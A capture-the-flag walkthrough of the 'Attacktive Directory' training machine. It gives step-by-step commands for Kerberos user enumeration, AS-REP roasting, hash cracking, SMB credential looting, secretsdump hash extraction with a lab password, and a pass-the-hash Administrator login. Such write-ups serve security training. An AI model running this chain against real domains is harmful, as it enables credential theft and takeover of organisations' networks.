# Attacktive Directory Walkthrough

This walkthrough covers the exploitation of the *Attacktive Directory* machine, designed to develop Active Directory hacking skills.

Wordlists used:
- [Usernames](https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt)
- [Passwords](https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt)

---

## Enumeration

Initial service enumeration was performed using **Nmap**, revealing the following:

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-29 09:55:40Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49683/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
49832/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

---

## Host Mapping

Add the domain to `/etc/hosts`:

```bash
echo "MACHINE_IP spookysec.local" | sudo tee -a /etc/hosts
```

---

## SMB Enumeration with Enum4Linux

Used `enum4linux` for basic SMB enumeration on ports 139 and 445:

```bash
enum4linux -A spookysec.local
```

This provided possible usernames and domain information.

---

## User Enumeration with Kerbrute

Discovered valid usernames using `kerbrute`:

```bash
kerbrute userenum --dc spookysec.local -d spookysec.local userlist.txt
```

Identified a valid user: `svc-admin`.

---

## AS-REP Roasting

Requested a Kerberos TGT for `svc-admin`:

```bash
python3 /opt/impacket/examples/GetNPUsers.py spookysec.local/svc-admin
```

Cracked the hash with Hashcat:

```bash
hashcat -m 18200 hash.txt passwordlist.txt
```

---

## SMB Shares Access

Used the `svc-admin` credentials to list available shares:

```bash
smbclient -L spookysec.local -U svc-admin
```

Accessed the `backup` share:

```bash
smbclient \\spookysec.local\backup -U svc-admin
```

Downloaded a file using:

```bash
get backup_credentials.txt
```

Decoded the base64 content:

```bash
cat backup_credentials.txt | base64 -d
```

Revealed credentials for user `backup`.

---

## Dumping Password Hashes

With the `backup` credentials, dumped password hashes:

```bash
secretsdump.py spookysec.local/backup:backup2517860@spookysec.local > hashes.txt
```

Recovered the NTLM hash for `Administrator`.

---

## Privilege Escalation (Pass-the-Hash)

Used Evil-WinRM to connect as `Administrator`:

```bash
evil-winrm -i spookysec.local -u Administrator -H <NTLM_HASH>
```

---

**Machine pwned.**
